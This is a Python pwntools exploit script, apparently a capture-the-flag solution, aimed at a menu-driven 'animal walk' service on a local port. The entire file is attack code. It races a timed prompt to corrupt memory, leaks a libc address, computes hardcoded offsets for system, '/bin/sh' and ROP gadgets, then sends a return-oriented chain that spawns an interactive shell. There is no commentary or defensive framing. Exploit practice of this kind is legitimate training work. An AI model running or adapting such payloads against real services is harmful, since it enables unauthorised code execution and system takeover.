from pwn import *

context.arch='amd64'
HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '0.0.0.0', 31338
r = remote(HOST, PORT)

def create(t, name):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', t)
    r.sendafter(b': ', name)

def walk():
    r.sendlineafter(b'> ', b'2')

def rename(name):
    r.sendlineafter(b'> ', b'3')
    r.sendafter(b': ', name)

create(b'dog', b'A'*0x10 + p64(0x100))
walk()
r.recvuntil(b'for a walk..')
start = time.monotonic()

r.sendline(b'1')
r.recvuntil(b'animal type: ')
time.sleep(max(0, 4.04- (time.monotonic() - start)))

r.sendline(b'hamster')
r.sendafter(b'name: ', b'B'*0xf)
time.sleep(0.2)


rename(b'B'*0x40)
walk()
r.recvuntil(b'B'*0x40)
libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x29d90
binsh = libc + 0x1d8698
system = libc + 0x50d70
ret = libc + 0x29139
pop_rdi = libc + 0x2a3e5

r.sendline(b'1')
r.sendlineafter(b': ', b'dog')
r.sendafter(b': ', b'A'*0x10+p64(0x100))
walk()
r.recvuntil(b'for a walk..')
start = time.monotonic()

r.sendline(b'1')
r.recvuntil(b'animal type: ')
time.sleep(max(0, 4.04- (time.monotonic() - start)))

r.sendline(b'hamster')
r.sendafter(b'name: ', b'B'*0xf)
time.sleep(0.2)

payload = flat([
    b'B'*0x10,p64(0x100),
    b'B'*0x28,
    ret,
    pop_rdi,binsh,
    system
])
r.sendline(b'3')
r.send(payload)
time.sleep(1)
r.sendline(b'4')
r.interactive()